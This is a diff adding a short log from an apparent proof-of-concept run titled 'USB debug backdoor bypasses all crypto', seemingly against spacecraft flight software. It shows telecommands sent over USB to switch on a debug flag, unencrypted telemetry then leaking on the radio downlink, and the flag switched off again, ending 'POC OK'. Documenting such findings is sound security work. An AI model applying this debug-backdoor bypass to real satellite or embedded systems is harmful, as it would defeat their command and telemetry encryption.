@@ -1,0 +1,17 @@
+[   0.000] ========================================================================
+[   0.000] V0-12 USB debug backdoor bypasses all crypto
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x10 via=usb AES  payload=01
+[   0.000] <-- TM apid=0x10 clear len=4
+[   0.000] debug status TM: usb_debug=1 secure_flag=1
+[   0.000] --> TC apid=0x0C via=radio clear payload=-
+[   0.000] <-- TM apid=0x09 clear len=17
+[   0.000] --> TC apid=0x0C via=usb clear payload=-
+[   0.000] <-- TM apid=0x0C clear len=27
+[   0.000] clear TM on radio downlink: 01015f1f120a0a0800009403
+[   0.000] --> TC apid=0x10 via=usb clear payload=00
+[   0.000] <-- TM apid=0x10 clear len=4
+[   0.000] bypass off again: usb_debug=False
+[   0.000] ========================================================================
+[   0.000] POC OK
+[   0.000] ========================================================================
